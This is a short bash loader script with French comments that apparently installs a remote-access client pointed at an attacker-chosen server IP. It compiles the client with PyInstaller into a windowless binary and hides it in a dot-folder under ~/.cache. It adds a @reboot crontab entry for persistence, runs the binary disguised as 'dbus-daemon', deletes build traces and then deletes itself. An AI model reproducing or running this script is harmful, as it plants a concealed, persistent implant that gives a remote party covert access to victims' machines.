#!/bin/bash

#adapter l'ip du server
read -p "Entrez l'IP du serveur : " server_ip

#remplace la valeur de l'ip server dans client.py
sed -i "s/HOST = .*/HOST = \"$server_ip\"/g" client/client.py

#installe PyInstaller
if ! command -v pyinstaller &> /dev/null; then
    echo "[+] Installation de PyInstaller..."
    pip install pyinstaller &>/dev/null
fi

#compilation du binaire via PyInstaller
echo "[+] Compilation du client.py en binaire discret..."
pyinstaller --onefile --noconsole client/client.py &>/dev/null

#cache le binaire
mkdir -p ~/.cache/.clientbin
mv dist/client ~/.cache/.clientbin/

#supprimer les traces 
rm -rf build dist __pycache__ client.spec


chmod +x ~/.cache/.clientbin/client

#création d'un crontab au démarrage 
(crontab -l 2>/dev/null | grep -v "~/.cache/.clientbin/client"; echo "@reboot ~/.cache/.clientbin/client &>/dev/null &") | crontab -

#execute le binaire
echo "[+] Exécution directe du binaire..."
exec -a dbus-daemon ~/.cache/.clientbin/client &>/dev/null &

echo "[+] Terminé !"

#suppression du loader.sh
rm -- "$0"
